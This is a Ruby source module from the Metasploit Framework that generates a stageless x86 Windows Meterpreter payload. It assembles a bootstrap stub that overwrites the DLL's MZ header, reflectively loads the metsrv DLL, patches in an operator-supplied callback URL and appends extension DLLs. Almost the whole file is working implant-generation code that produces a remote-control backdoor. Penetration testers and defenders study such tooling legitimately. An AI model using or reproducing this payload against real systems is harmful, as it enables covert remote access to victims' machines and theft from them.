#-*- coding: binary -*-

require 'msf/core'
require 'rex/payloads/meterpreter/patch'

module Msf

##
#
# Implements stageless invocation of metsrv in x86
#
##

module Payload::Windows::StagelessMeterpreter

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::ReflectiveDLLLoader

  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          dec ebp               ; 'M'
          pop edx               ; 'Z'
          call $+5              ; call next instruction
          pop ebx               ; get the current location (+7 bytes)
          push edx              ; restore edx
          inc ebp               ; restore ebp
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
          call ebx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
          ; offset from ReflectiveLoader() to the end of the DLL
          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
          push ebx              ; push the pointer to the extension list
          push 4                ; indicate that we have attached
          push eax              ; push some arbitrary value for hInstance
          mov ebx, eax          ; save DllMain for another call
          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
          ; push the exitfunk value onto the stack
          push #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
          push 5                ; indicate that we have detached
          push eax              ; push some arbitrary value for hInstance
          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
    ^

    asm
  end

  def generate_stageless_meterpreter(url = nil)
    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x86.dll'))

    conf = {
      :rdi_offset => offset,
      :length     => dll.length,
      :exitfunk   => datastore['EXITFUNC']
    }

    asm = asm_invoke_metsrv(conf)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if bootstrap.length > 62
      print_error("Stageless Meterpreter generated with oversized x86 bootstrap.")
      return
    end

    # patch the binary with all the stuff
    dll[0, bootstrap.length] = bootstrap

    # the URL might not be given, as it might be patched in some other way
    if url
      # Patch the URL using the patcher as this upports both ASCII and WCHAR.
      unless Rex::Payloads::Meterpreter::Patch.patch_string!(dll, "https://#{'X' * 512}", "s#{url}\x00")
        # If the patching failed this could mean that we are somehow
        # working with outdated binaries, so try to patch with the
        # old stuff.
        Rex::Payloads::Meterpreter::Patch.patch_string!(dll, "https://#{'X' * 256}", "s#{url}\x00")
      end
    end

    # if a block is given then call that with the meterpreter dll
    # so that custom patching can happen if required
    yield dll if block_given?

    # append each extension to the payload, including
    # the size of the extension
    unless datastore['EXTENSIONS'].nil?
      datastore['EXTENSIONS'].split(',').each do |e|
        e = e.strip.downcase
        ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{e}", 'x86.dll'))

        # append the size, offset to RDI and the payload itself
        dll << [ext.length].pack('V') + ext
      end
    end

    # Terminate the "list" of extensions
    dll + [0].pack('V')
  end

end

end

